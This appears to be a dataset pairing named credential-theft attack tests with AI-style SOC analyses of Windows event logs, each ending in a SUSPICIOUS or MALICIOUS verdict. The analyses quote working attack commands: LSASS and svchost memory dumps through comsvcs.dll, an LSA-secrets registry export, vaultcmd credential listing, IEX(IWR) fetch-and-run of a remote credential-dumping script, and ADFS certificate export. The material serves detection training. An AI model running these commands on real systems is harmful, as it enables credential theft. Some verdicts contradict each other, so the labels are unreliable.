3. **PowerShell Log Observations**:
    - The PowerShell logs corroborate the Sysmon logs in showing execution of PowerShell commands wrapped in `ConsoleHost`. There is no immediate indication of specific malicious payloads, but the use of `setspn.exe` in such a manner and the targeting of `%USERDNSDOMAIN%` is unusual for regular administrative operations.

### Assessment

The overall behavior observed in these logs, particularly the repeated use of PowerShell with networking-related reconnaissance techniques and frequent EdgeUpdate activities, raises some flags. The PowerShell command usage is particularly concerning due to:
- Possible reconnaissance of Active Directory.
- Potential obfuscation efforts.

### Recommendation and Resolution

Based on these findings, the activity is deemed **SUSPICIOUS**. Although it's not conclusively malicious without further contextual information, this activity merits additional investigation due to:
- The use of PowerShell for fetching SPNs, which is often associated with lateral movement.
- The presence of potentially obfuscated log-clearing activity.
  
**Next Steps**:
- Investigate the context and origins of the PowerShell tasks and queries.
- Check for any unauthorized account activities or unexpected privilege changes.
- Review the configurations and deployments of Edge updates on this and similar systems to ensure they match expected patterns.

- Evaluate endpoint security solutions for additional visibility and protection measures, including monitoring PowerShell use.
"
Dump svchost.exe to gather RDP credentials,"Based on the provided Windows event logs, several indicators suggest potentially suspicious or malicious activity. Here's a detailed analysis of the logs:

### PowerShell Logs:
The PowerShell logs indicate the execution of a command that attempts to create a memory dump of a process using `rundll32.exe` and `comsvcs.dll`. The command is as follows:
```shell
powershell.exe & {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full}
```
- **Suspicious Behavior:**
  - Usage of `Get-NetTCPConnection` to check for established RDP connections (`LocalPort 3389`) and attempt to identify the owning process.
  - Execution of `rundll32.exe` to create a minidump using `comsvcs.dll`. This is not typical behavior and is often associated with malicious activity like credential dumping or reconnaissance by attackers.

### Security Logs:
- **Privileged Logon (Event ID 4672):** The user `admin_test` logged on with high privileges and several sensitive privileges granted (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege` etc.). These permissions can be used maliciously if obtained by an unauthorized user.
- **Logon Events (Event ID 4624):** Multiple logon events with type `3` (network logon) from a workstation (`DESKTOP-3HL5B2P`) using NTLM authentication. While network logons can be normal, in the context of other suspicious activities, they should be further scrutinized.

### Sysmon Logs:
- Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `admin_test`. 
- The execution of `rundll32.exe` matches the behavior noted in the PowerShell logs. This aligns with potentially malicious activities of dumping process memory, which might indicate an attempt to extract sensitive information or credentials.
- Execution of typical system utilities (`HOSTNAME.EXE`, `whoami.exe`) often seen in reconnaissance activities to gather system information.

### Overall Assessment:
The combination of high-privileged commands attempting to create a memory dump of processes, network logons with elevated privileges, and executions of system utilities often associated with reconnaissance or persistence strategies heavily indicate suspicious or malicious behavior.

### Resolution:
**MALICIOUS** - the logs strongly suggest malicious activity potentially involving credential theft or reconnaissance, likely executed by unauthorized access or a compromised account.

### Guidance on How to Proceed:

**Anomalous and Potentially Malicious Activity Identified:**

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - There are multiple instances of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` being executed in quick succession by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate tool used for managing Windows event logs, its frequent invocation without clear context or administrative task requirement could suggest log manipulation or unauthorized querying.

2. **Suspicious PowerShell Command Execution:**
   - The PowerShell command: 
     ```plaintext
     powershell.exe & {$cert = New-SelfSignedCertificate -DnsName file.com -CertStoreLocation cert:\LocalMachine\My, Set-Location Cert:\LocalMachine\My, Export-Certificate -Type CERT -Cert Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath $env:Temp\file.cer}
     ```
     This command creates a self-signed certificate and exports it. The creation of self-signed certificates can be suspicious if not part of routine operations, especially if targeted at `LocalMachine\My`, which is accessible system-wide.

3. **Suspicious Event Log Timestamp Manipulation:**
   - Security Log EventID `4616` indicates a change in system time by `LOCAL SERVICE` through `svchost.exe`. Altering system time is a known tactic used to obfuscate event timelines and can indicate malicious activity such as evading detection mechanisms.

4. **High Privilege Granted to User:**
   - Security Log EventID `4672` shows the user `SERVER002\admin_test` receiving several high-level privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, shortly after the suspicious PowerShell activity. This could signal a privilege escalation attempt.

5. **Network-Related Processes:**
   - In the Windows Sysmon logs, processes like `sppsvc.exe` and `WmiPrvSE.exe` running under `NT AUTHORITY\NETWORK SERVICE` and `NT AUTHORITY\SYSTEM` do not initially indicate anything suspicious but should be observed for lateral movement indicators. 

**Overall Assessment and Risks:**

The combination of frequent log clearing attempts, self-signed certificate issuance, suspicious system time manipulation, and unquenchable accumulation of high privileges indicates a potential compromise. The attacker might be attempting to establish persistence, cover tracks, or prepare for further exploitation.

  - Conduct further investigation to confirm whether these actions were sanctioned administrative tasks. This may involve interviewing relevant IT personnel or checking organizational IT policies.
  - Analyze additional correlating logs, such as network logs or additional host-based logs, to gain deeper insight into the context and intentions behind these activities.
  - Review system access logs for any unauthorized access or anomalies in access times and sources.

### Final Resolution
- **SUSPICIOUS**: The logs display suspicious behavior that necessitates further investigation to discern if these activities were executed within the constraints of legitimate administrative operations or indicative of a compromise."
Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials],"Upon analyzing the provided logs, here are the key observations:

### System Log:
- Kernel-General and Time-Service logs show normal Windows time synchronization events with either `svchost.exe` or `time.windows.com` as the time source. This is typical behavior for timekeeping on a Windows server.

### Windows PowerShell Log:
- A `PowerShell` command ran with `vaultcmd /listcreds:""Windows Credentials"" /all`. This command attempts to list out all Windows credentials. Such actions can sometimes indicate unauthorized access to stored credentials, especially if they were unexpected or unauthorized by the user or IT policy.

### Sysmon Log:
- Several executions of `wevtutil.exe` and `conhost.exe` by the `admin_test` user. `wevtutil.exe` is typically used for querying and managing event logs, while `conhost.exe` is usually a console window host. This might suggest log inspection or event log manipulation, which is suspicious if not expected.
- `hostname.exe` and `whoami.exe` were executed, which are benign if part of standard administrative or troubleshooting procedures.
- PowerShell was launched from `wsmprovhost.exe`, but in the context of running `vaultcmd`, as seen in the PowerShell logs, increasing the suspicion level.
- Multiple instances of Microsoft Edge Update, with high frequency, suggest scheduled updates, and are likely benign unless interfering with regular operations.

### Application Log:
- `edgeupdate` service activity is seen stopping and likely correlates with the frequent updates seen in the Sysmon logs. This aligns with typical browser update behavior and is benign.

### Security Log:
- Security-Auditing logs reflect normal time change activity.

### Assessment:
1. The usage of `vaultcmd` to retrieve Windows Credentials without a clear administrative or operational need is suspicious and indicative of potential credential access or reconnaissance.
2. Frequent executions of `wevtutil.exe` by an admin user may suggest potential log review or manipulation, which warrants investigation if unexpected.
3. Besides these suspicious activities, other logs reflect benign and routine system operations.

### Resolution:
- **SUSPICIOUS**: This determination stems from the unauthorized or unexpected use of `vaultcmd` to access credentials, alongside a pattern of potential log manipulation using `wevtutil.exe`.

### Guidance:
- Investigate further with the user/admin_test to verify the legitimacy of these activities. Determine if they were conducting legitimate administrative functions or if unauthorized access occurred.
- Check if there is unusual account usage, especially any indication of privilege escalation or additional credential access.
- Assess protective measures around `vaultcmd` usage, potentially restricting access or increasing monitoring.
- Review endpoint configuration, permissions, and alert settings to ensure unusual PowerShell command executions trigger alerts."
Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos),"### Detailed Analysis

Upon reviewing the provided logs, several signs of suspicious and outright malicious activity have been identified:

1. **Security Events (Event ID 4616)**: 
   The Security logs show timestamp anomalies where process `svchost.exe` was involved in system time alteration events. Although these events themselves are not inherently malicious, frequent alterations to the system time can be indicative of nefarious actions such as tampering with timestamps to evade detection.

2. **PowerShell Activities**:
   The Windows PowerShell logs reveal execution of a script that initiates a brute-force attack on user credentials. This is highly suspicious and indicative of malicious activity:
   - The script involves iterating over a list of passwords (`passwords.txt`) located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\` and attempts to bind credentials using NTLM authentication.
   - Such activity is a classic example of a credential brute force attack, likely designed to gain unauthorized access to accounts.

3. **Sysmon Logs**:
   - The logs capture the execution of various processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by a user named `admin_test`. 
   - Most importantly, the Sysmon log also provides evidence of the execution of `powershell.exe` with a script indicative of malicious intent (same brute force script above). 

4. **System and Application Logs**:
   - System log reflects time changes corresponding to the security log, reinforcing the suspicious context of the svchost process activity.
   - The application log does not show any apparent anomalies related to security.

### Assessment

The primary concern identified in the logs is the execution of a PowerShell script intended to perform credential brute-forcing, which constitutes a clear malicious activity. This points towards an attempted compromise using unauthorized means to access credentials. While the time alteration events, by themselves, might not always be malicious, in conjunction with the unauthorized brute-force attempts they raise the concerns further.

### Conclusion

Given the direct evidence of a brute-force attack conducted using PowerShell, the activities in the logs can be classified as **MALICIOUS**. Immediate action is required to address the potential breach.

### Recommendations

1. **Containment**: Isolate the affected system (Server002) from the network to prevent further unauthorized attempts or potential lateral movement within the network.

2. **Eradication**: 
   - Remove or disable access to the temporary directory where the `passwords.txt` file is located.
   - Review and clean any other signs of unauthorized scripts or malicious software from the system.

3. **Recovery**: 
   - Restore system time to correct values if manipulated manually.
   - Apply system and security patches to prevent known vulnerabilities from being exploited.

4. **User Account Security**: 
   - Conduct a forced password reset for all user accounts on the affected machine.
   - Implement account lockout policies to prevent brute-force attempts.

5. **Monitoring and Alerting**: 
   - Set up advanced alerting for suspicious PowerShell activities and other indicators of similar intrusions.
   - Continuously monitor the network traffic of critical systems for unusual patterns."
Dump LSASS.exe Memory using NanoDump,"Based on the provided Sysmon and Application logs, here is a detailed analysis of the logs concerning suspicious or potentially malicious activity:

### Analysis:

1. **Repeated Execution of Common Utility Tools:**
   - The logs show repeated execution of utility programs such as `wevtutil.exe`, `hostname.exe`, and `whoami.exe` by the user `SERVER002\admin_test`. While these utilities are part of standard Windows operations, frequent execution in a short timeframe without clear context could suggest exploration or reconnaissance activity.

2. **Command-Line Execution with Suspicious Paths:**
   - The logs present a `cmd.exe` execution with the command line argument: `""cmd.exe"" /c C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script.x64.exe -w ""%%temp%%\script.dmp""`. This execution style implies the running of a potentially suspicious script (`script.x64.exe `) found in a temporary user directory which is a common vector for malicious payloads. Such practice could indicate attempts to execute and potentially deliver malicious payloads.

3. **Wow64 Emulation Layer Notification:**
   - The Application log contains a notification about the execution of `script.x64.exe` from the `Wow64 Emulation Layer`, suggesting that a 64-bit binary likely intended for a 64-bit Windows environment was run under a 32-bit context. This action is uncommon and raises a red flag, as malware often uses such techniques to bypass standard detection mechanisms.

4. **Unusual Process Ancestry:**
   - The process ancestry for `cmd.exe`, which executes the unknown `script.x64.exe`, shows no legitimate parent process associations (e.g., `explorer.exe`).
   - Parent-child process relationships are consistent with typical exploitation strategies where malicious scripts or binaries are executed after leveraging system command components.

### Assessment:

The behavior observed in the log activities, such as the quick succession of utility executions, execution of possibly malicious scripts from temporary directories, and its invocation via command line, definitely raises concern. Additionally, the scripting command involves a path obfuscation attempt (""..\\Externalfiles\\"") which is a common technique used in various forms of attacks to hide malicious activity.

### Threat/Risk Identified:

Given the evidence, the system could have been targeted for reconnaissance and potentially executing a malicious payload. While the exact intent or payload delivered by the `script.x64.exe` is not determined from the logs alone, the action's pattern aligns with peculiarly crafted execution seen in numerous malware incidents.

### Guidance on How to Proceed:
- **Isolate the System:** Temporarily disconnect the server `SERVER002` from the network to prevent any potential spread of the threat.
- **Collect Samples:** Retrieve a copy of `script.x64.exe` from the specified location for further static and dynamic malware analysis.
- **Full Audit:** Engage in a thorough inspection and audit of the system's file directories, registry, and scheduled tasks to uncover any potential additional footholds or persistence mechanisms.
- **Review User Activity:** Investigate account activity for `admin_test` to establish any further anomalies or deviations from standard patterns seen prior to the event.
- **Patch and Secure:** Ensure all systems running on the network are updated with the latest OS patches, antivirus definitions, and enabled security features like PowerShell logging and AppLocker rules.

### Resolution: 

**MALICIOUS** - The logs contain indicators of potentially malicious activity involving the execution of an unfamiliar script with suspicious behavior under command-line control. Additional validation is required for an accurate attack vector identification."
Dump credentials from Windows Credential Manager With PowerShell [web Credentials],"### Analysis of the Logs

Upon carefully analyzing the provided logs, several aspects stand out, indicating potential malicious activity:

1. **PowerShell Execution:**
   - There is a recorded execution of PowerShell (`Event ID: 18005`) with the following command:
     ```powershell
     ""powershell.exe"" & {IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force}
     ```
   - This script appears to be pulled from an external source (GitHub) and includes the command `Get-CredManCreds -Force`, which is suspicious as it attempts to retrieve credentials from the Windows Credential Manager.

2. **Integrity and Privileges:**
   - The PowerShell process was executed with high integrity under the account `SERVER002\admin_test`, which indicates a high level of privilege that could facilitate credential theft or further malicious actions.

3. **Sysmon and Conhost Activity:**
   - Several instances of `conhost.exe` and `wevtutil.exe` executions in rapid succession, typically used in benign scenarios, but when correlated with unauthorized credential access potentially serve as a smokescreen or post-exploitation attempt.
   
4. **EdgeUpdate Executions:**
   - Multiple instances of `MicrosoftEdgeUpdate.exe` were logged. However, this may be related to legitimate software updates but should be validated against expected update schedules due to the intensity of activity noted.

### Assessment

The execution of PowerShell with an external script intended to extract credentials is a significant indicator of compromise. The use of legitimate utility binaries to obfuscate actions combined with high privilege level execution suggests potentially malicious activity.

### Conclusion

- **Resolution: MALICIOUS**  
  The logs contain clear indicators of a potentially malicious script execution aiming to steal credentials. The unauthorized downloading and execution of a PowerShell script from an untrusted source are critical risk factors.

### Suggested Actions

1. **Immediate Response:**
   - Terminate any suspicious PowerShell processes still running on the system.
   - Conduct a full scope review of network and application logs to assess further unauthorized access or data exfiltration attempts.

2. **Credentials Review:**
   - Escalate the credential monitoring and consider forced password resets for `SERVER002\admin_test` and any other users with elevated privileges.

3. **Network Controls:**
   - Implement improved network segmentation and outbound traffic restrictions to prevent external script execution from unverified sources.

4. **Incident Report:**
   - Document the findings and notify the information security team to align additional containment and eradication measures.

5. **Forensics and Assessment:**
   - Engage in deeper forensic analysis on the host to identify persistence mechanisms, additional payloads, or lateral movement.

By addressing these concerns promptly, the organization can mitigate the current threat and enhance its resilience against similar future incidents."
Dumping LSA Secrets,"### Detailed Analysis of the Logs

Upon analyzing the provided Windows event logs, several activities emerge that warrant closer examination. Here's the detailed breakdown:

1. **PowerShell Execution Logs:**
   - Event ID 5 shows the execution of `powershell.exe` by the user `SERVER002\admin_test`. While PowerShell is a legitimate tool, it is often used by attackers to carry out fraudulent activities. In this case, the logs do not provide the command line arguments used, thereby making it difficult to assess the intent behind this PowerShell instance.

2. **Cmd.exe Activity:**
   - Event ID 1 reveals an instance of `cmd.exe` executing with a command line that involves saving registry secrets into a temporary directory. The command `""cmd.exe"" /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\data.004\bin\script.exe"" -accepteula -s reg save HKLM\security\policy\secrets %%temp%%\secrets /y` suggests that this process might be exporting sensitive data. This activity is suspicious and typical in scenarios involving credential dumping or registry hive extraction. The execution of a potential script to interact with security-related registry keys further adds to the suspicion.

3. **Usage of System Tools:**
   - Multiple occurrences of utility tools being executed (`wevtutil.exe`, `hostname.exe`, `whoami.exe`) by the same user `SERVER002\admin_test` within a short timeframe are noted. While these tools are commonly used for administrative purposes, such clustered activity could indicate reconnaissance efforts to gather system information.

4. **Scheduled Updates and Maintenance Activities:**
   - Entries related to Windows Update client activities show typical system maintenance behaviour (e.g., `wuauclt.exe`, `MpSigStub.exe`, `AM_Delta.exe`). These appear to be legitimate processes, associated with security intelligence updates and system maintenance tasks, indicating regular, non-malicious system activity.

5. **Unusual Process Parentage:**
   - The parent-child relationship of some processes, especially `hostname.exe` and `whoami.exe`, whose parent process is `wsmprovhost.exe`, is unusual for regular user-initiated commands but suggests automation or script execution by potentially elevated processes.

### Assessment of the Situation

- **Suspicious Behavior**: The execution of `cmd.exe` with parameters that suggest the extraction of registry secrets is particularly concerning and is not typical in standard operational procedures, especially on a high-profile machine like that of a CEO.
- **Persistent and Clustered Execution**: The simultaneous execution of multiple administrative tools suggests that someone might be trying to ascertain system characteristics and leverage them, possibly for lateral movement or data exfiltration.

### Recommendation

Given the findings, the overall assessment leans towards a significant anomalous activity with a potential compromise risk:

- **Resolution**: **SUSPICIOUS** - The logs exhibit signs of activities that do not align with expected behavior. They necessitate further investigation to understand the context and intent behind these actions.

### How to Proceed

1. **Immediate Action**: Isolate the involved machine to prevent potential lateral movement within the network.
2. **Investigate Further**:
   - Corroborate these findings with additional logs such as security event logs, PowerShell transcripts, and audit logs for more detailed command execution.
   - Check for any unauthorized changes or anomalies in user accounts and group memberships.
3. **Conduct Threat Hunting**: Identify any other hosts or systems exhibiting similar activities.
4. **Endpoint Monitoring**: Enhance endpoint monitoring controls to detect any suspicious activity in real-time.
5. **User Awareness**: If internal misuse is suspected (e.g., accidental action by the `admin_test` user), education, and awareness training should be conducted.

This will provide a clearer understanding of the nature of the potential threat and how best to mitigate it moving forward."
Send NTLM Hash with RPC Test Connection,"Upon reviewing the provided Windows event logs, the following observations were noted:

### Anomalous Behavior:

1. **Repeated Execution of System Utilities**:
   - The logs indicate multiple executions of `wevtutil.exe` and `conhost.exe` processes by the user `SERVER002\admin_test`. These executions are closely timed and occur in rapid succession. While these utilities are native to Windows, their rapid and repeated execution could signal an attempt to access or manipulate event logs or another automated activity.

2. **PowerShell and RPCPing Activity**:
   - There is a PowerShell execution with the command line `""powershell.exe"" & {rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1>$Null}`. This command uses `rpcping`, a tool used to ping a server using RPC, directed at localhost, which is usually not common unless specifically testing or troubleshooting local services. The use of NTLM for authentication here is unusual for a service hosted on localhost.

3. **High Integrity Level Processes**:
   - Processes are being run at a high integrity level. This could indicate elevated privileges, which is normal for an admin account but should still be monitored for unusual activity.

4. **Credential Fetch Failures**:
   - The security logs document several credential fetch failures with return code `3221226021`, indicating possible failed attempts to retrieve credentials related to specific targets like `MicrosoftAccount` and `WindowsLive`.

### Assessment:

- **PowerShell & RPCPing Usage**: 
  - The PowerShell command in conjunction with `rpcping` targeting localhost could be indicative of a script's operation or test rather than directly malicious activity. However, this pattern might be suspicious if unexpected.

- **Repeated System Utility Execution**:
  - The repeated access to `wevtutil.exe` could indicate attempts to read or clear logs, often a tactic used by malware to hide its tracks. However, without further specific evidence, this activity is suspicious rather than overtly malicious.

- **Credential Fetch Failures**:
  - While normal operations sometimes lead to credential-based warnings, the timing might suggest an automated task attempting login which failed, possibly an outdated task pointing to non-existent accounts or contexts.

### Recommendation and Resolution:

Given the combination of unexpected `rpcping` use, repeated system tool invocation, and unexplained credential errors, the activity is deemed as needing further investigation but not conclusively malicious.

**Resolution: SUSPICIOUS**

### Guidance:

1. **Further Investigation**:
   - Review other related logs, such as network, to check if any unexpected connections were established.
   - Check for scripts or scheduled tasks that might have invoked the observed PowerShell and utilities.

2. **User Behavior Review**:
   - Verify if these actions correlate with legitimate administrative tasks. Sometimes system administrators might run scripts for troubleshooting which could generate similar logs.

3. **Environment Configuration**:
   - Check security settings for anomalies or unexplained privileged access, and ensure that all admin accounts are being used legitimately.

4. **Security Measures**:
   - Consider implementing stricter logging and alerting around the use of utilities like `wevtutil` and `rpcping`.

By continuing to monitor the system, any repeat or escalation in the behavior can be detected and addressed promptly."
Create Volume Shadow Copy remotely with WMI,"Upon reviewing the Windows event logs, several observations are made that help in assessment:

### Observations:

1. **Security Logs**: 
   - Events 4904 and 4905 relate to VSS auditing which is related to changes in the system's security audit policy. The Process `VSSVC.exe` (Volume Shadow Copy Service) seems to be operating in a standard manner as part of Windows operations for creating snapshots or backups.
   - Events 5379 show attempts to access credentials (Failed access attempts with ReturnCode 3221226021, which generally means a security permission issue or missing privileges). This failure can happen during legitimate operations if there is permission or credential access misconfiguration.

2. **Sysmon Logs**:
   - The logs document the execution of several system processes by the user `admin_test`:
     - Usage of `cmd.exe` to perform `wmic shadowcopy` operations which are legitimate administrative commands used to manage shadow copies. However, using `wmic` this way can be abused by attackers to delete shadow copies in ransomware attacks, but it is not inherently malicious on its own.
     - `wevtutil.exe` is used multiple times, which is typically used for managing logs. Digging into logs is a regular administrative task, but repeated and unusual contexts could imply log manipulation to cover tracks.
     - `hostname.exe` and `whoami.exe` processes were also executed, often harmless when used by administrators for routine checks.
     - `taskhostw.exe` and updates (`wuauclt.exe`, `AM_Delta.exe`, `MpSigStub.exe`) suggest typical operations like task management and software updates using normal system processes.

3. **Application and System Logs**:
   - Windows Defender is running (`SECURITY_PRODUCT_STATE_ON`), providing real-time protection.
   - Windows Update events indicate successful deployment and installation of updates, which reflects good system hygiene.

### Assessment:

- **Potentially Suspicious Behavior**: 
  - The `wmic shadowcopy list` and subsequent `shadowcopy call create` commands could be standard operations by an admin user but should be contextualized—these commands, if seen in large numbers without other backup processes, may need further investigation to exclude misuse in ransomware scenarios.
  - Use of `wevtutil.exe` by `admin_test` might indicate log auditing but should be reviewed to ensure it aligns with the user's administrative duties, as this could theoretically be used for log tampering.

### Conclusion and Recommendation:

- **Resolution**: **SUSPICIOUS**

Given the current context, logs suggest potentially suspicious activities particularly around the usage of shadow copy commands and repeated log management commands. Further investigation might be necessary to ascertain the intention behind these operations and whether they align with legitimate administrative tasks. 

**Next Steps**:
- Verify the actions with the user `admin_test` to confirm whether these were intentional and align with their job responsibilities.
- Conduct checks to ensure the integrity of system backups and logs.
- Review system settings to ensure proper permissions and check for any anomalies or incidents where these tools could have been misused."
Dump LSASS.exe Memory through Silent Process Exit,"Upon reviewing the provided logs, I have identified several activities that stand out and could indicate potential malicious behavior. Below is my detailed analysis:

### Application Log:
- The log entry displays an execution of `script.x64.exe` from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\script.x64.exe`). Executing binaries from temporary directories is a typical pattern associated with malicious activities such as malware deployment or fileless malware execution.

### Sysmon Log:
1. **Execution Context**:
   - There is an entry in the Sysmon log indicating the execution of a PowerShell process (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) by the user `SERVER002\admin_test`. This is a common technique used by attackers to run scripts or commands without direct detection.

2. **Unusual Command Lines**:
   - The command `cmd.exe` is invoked to execute a script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script.x64.exe`—another hint pointing towards potentially unauthorized script execution. 
   - The use of the `--silent-process-exit` parameter could be a way to avoid drawing attention to the process upon its completion.

3. **Process Spawn Patterns**:
   - Frequent invocation of `wevtutil.exe` is unusual if it is not part of a regular scheduled maintenance process. `wevtutil` can be used to query and manage event logs, and its use might indicate attempts to tamper with logs.
   - Execution of `whoami.exe` and `hostname.exe` in quick succession by `admin_test` might be an attempt by an attacker to fingerprint the environment by gathering system information.

4. **Privilege Context**:
   - Most of these processes are executed under `SERVER002\admin_test` with high integrity levels, suggesting a high-privileged access context, which is indicative of potential privilege abuse or misuse.

### Conclusion and Recommendation:
The log activities suggest an increase in process spawning and command-line execution from temporary directories, specifically involving script execution and PowerShell usage. These activities are not typical of benign user behavior and warrant further investigation.

### Resolution:
- **SUSPICIOUS**: The log entries display patterns associated with potentially unauthorized and suspicious usage. While no direct malicious payload is identified, the execution of unknown scripts from temporary directories, unusual process activities, and high-privilege use of administrative accounts requires deeper investigation.
  
### Guidance:
1. **Containment**: Isolate the system from the network to prevent potential lateral movement or data exfiltration.
2. **Threat Hunting**: Further investigate the origin of `script.x64.exe` and determine related file hashes for possible detection across the network.
3. **User Verification**: Confirm with the `admin_test` account holder about the legitimacy of these actions.
4. **Log Analysis**: Investigate the PowerShell logs for commands, scrutinize `wevtutil` activities for log modifications or deletions.
5. **System Snapshots**: Take a full system memory and disk snapshot for forensic analysis.
6. **Antivirus Scan**: Conduct a comprehensive security scan on the host and monitor for further anomalous behavior.

Taking these actions will help ascertain whether the detected activities are justified by legitimate user actions or if they represent an unauthorized attempt to compromise the system."
Dump LSASS.exe Memory using Out-Minidump.ps1,"Upon reviewing the provided Windows event logs, several activities suggest potential malicious behavior. Let's break down the key observations:

### Suspicious and Potentially Malicious Activity:

1. **PowerShell Activity with Remote Script Execution:**
   - There is a PowerShell execution with a command that attempts to download and execute a script from an external source `https://github.com/file/file-file/raw/master/files/data.001/src/script.ps1`. 
   - This technique is often used in malicious scenarios to execute remote scripts that could potentially lead to a system compromise.
   - The PowerShell command uses `IEX (IWR ...)` which stands for `Invoke-Expression` combined with `Invoke-WebRequest`, a known pattern for executing downloaded scripts directly in memory. This circumvents traditional file-based detection methods.

2. **Suspicious Process Creation:**
   - The process `wevtutil.exe` is seen being executed multiple times by the user `admin_test`. While `wevtutil` is a legitimate tool used to manage event logs, it can also be used by attackers to clear logs to cover their tracks.
   - Processes like `conhost.exe` and `whoami.exe` are spawned in conjunction with `wevtutil.exe`, common in scenarios where logs are being managed or investigated by an attacker.

3. **Fetching Process Information:**
   - The PowerShell command is using `get-process lsass`, which attempts to interact with the LSASS process. The Local Security Authority Subsystem Service (LSASS) is a target for attackers trying to dump credentials from memory.

### Assessment:

- **Indicators of Compromise (IOC)**:
  - Command executions related to PowerShell with external script fetching.
  - Processes like `wevtutil.exe` being used in a pattern that suggests possible tampering with the event logs.

### Risk and Threat Assessment:
- These activities present a high risk of compromise. The downloading and execution of remote scripts through PowerShell, combined with potential log tampering, indicate attempted or successful malicious activities.

### Resolution:
- **MALICIOUS**: Based on the analysis, the behavior detailed in the logs is indicative of malicious activity, involving remote script execution and potential log manipulation. 

### Guidance on How to Proceed:
1. **Immediate Containment**:
   - Isolate the affected machine (Server002) from the network.
   - Reset passwords or rotate credentials especially for `admin_test` to prevent lateral movement.
   
2. **Investigation and Forensics**:
   - Conduct a full disk analysis on Server002 to understand the extent of compromise.
   - Examine any downloaded or executed scripts for malware or backdoor implementations.
   - Review additional logs and network traffic for the scope of the attack and other potential affected systems.

3. **Eradication and Recovery**:
   - Remove any malicious software identified from the investigation.
   - Restore systems from a clean backup if available and ensure all software is up to date.
   - Implement richer monitoring and detection solutions, especially for PowerShell and remote command executions. 

4. **Post-Incident Analysis**:
   - Conduct a thorough post-mortem to identify gaps in security controls and improve the organization's detection and response capability."
ADFS token signing and encryption certificates theft - Local,"Upon analyzing the given logs, several indicators of potentially suspicious activity have been noticed, which may warrant further investigation. Here is a detailed breakdown:

### Indicators of Suspicious Activity:

1. **PowerShell Scripts and Modules:**
   - **AADInternals Module:** The logs indicate the use of PowerShell scripts involving the `AADInternals` module. AADInternals is a well-known script/module used for various administrative tasks related to Azure AD. However, it can also be misused by attackers to enumerate Azure AD information or manipulate Azure objects such as certificates.
   - **Command Execution:**
     ```plaintext
     powershell.exe & {Import-Module AADInternals -Force
     Export-AADIntADFSCertificates
     Get-ChildItem | Where-Object {$_ -like ""ADFS*""}
     ```
     This script suggests exporting ADFS certificates, potentially indicating an attempt to tamper with or extract sensitive authentication information.

2. **User Account:**
   - Actions are performed under the account `SERVER002\admin_test`. Although the account name suggests a test or administrative purpose, it should be verified whether the usage of this account aligns with its intended role. Often, administrative privileges can be exploited for unauthorized actions.

3. **Host and Module Information:**
   - The use of `ConsoleHost` and the version `5.1.19041.5007`.
   - Location of script execution is specified as `""C:\Users\admin_test\Documents\""`, which raises interest regarding the development of scripts or modules locally in potentially insecure directories.

4. **Process and Execution Logs (Sysmon):**
   - Multiple instances of PowerShell and console host processes (`conhost.exe`) executed with high integrity level, initiated by the same user. The Sysmon logs show a sequence of calls with rapid initiation times. These could potentially be indicative of automated scripts or batch processes executed for data collection or infiltration.
   - Specific interest should be given to the executed PowerShell commands, module importing, and certificate interaction activities.
   - Use of `wevtutil.exe` involves interaction with event logs, which could indicate log clearing or modification attempts.

5. **Edge Update Processes and Execution:**
   - Regularly scheduled updates for Microsoft Edge (`MicrosoftEdge_X64_130.0.2849.52_129.0.2792.89.exe`) appear to be executed by the `NT AUTHORITY\SYSTEM` user. While these could be benign, it's crucial to ensure they are legitimate updates as specific installers can be repurposed for illicit payload delivery.

### Assessment

Considering the activity involving PowerShell commands to interact with potentially sensitive certificates, especially using a known module like AADInternals, there is a risk of data exfiltration or credentials interception. The rapid sequence and nature of system calls are suspicious and merit a closer look.

### Recommendation and Resolution

- **SUSPICIOUS:** The logs contain activity that requires further investigation, including verifying the legitimacy and intended use of the `admin_test` account.
- **Immediate Actions:**
  1. Verify the integrity and source of the PowerShell scripts and the intent behind using AADInternals.
  2. Validate that the account `SERVER002\admin_test` is being used as intended and check for any signs of compromise.
  3. Conduct thorough endpoint scans and logs analysis to ensure no persistent threats exist.
  4. Monitor all subsequent activities associated with PowerShell and administrative accounts.

Further investigation and context are required to determine the full scope of potential risks and whether this activity is justified within the organizational policy."
Dump credentials from Windows Credential Manager With PowerShell [windows Credentials],"Upon reviewing the provided Windows event logs from the CEO's machine, several observations and concerns arise that may indicate suspicious and potentially malicious activity. Below is a detailed assessment based on the logs:

### Key Observations:

1. **Time Manipulation:**
   - In the Security logs, multiple `EventID 4616` records indicate a change in system time, performed by the process `svchost.exe`. This could suggest an attempt to manipulate time settings on the system, a tactic sometimes used by malicious actors to evade detection or manipulate logs.

2. **Abnormal PowerShell Activity:**
   - The Sysmon logs show the execution of PowerShell with an internet-based command invocation (IEX - Invoke-Expression) which downloads a script from a GitHub repository (`https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/...`). This script is intended to extract credentials stored in the Windows Credential Manager (`Get-PasswordVaultCredentials -Force`).
   - This type of PowerShell activity is highly suspicious. PowerShell scripts that involve downloading and executing scripts from the internet are often a hallmark of malicious activity, particularly when they involve credential access.

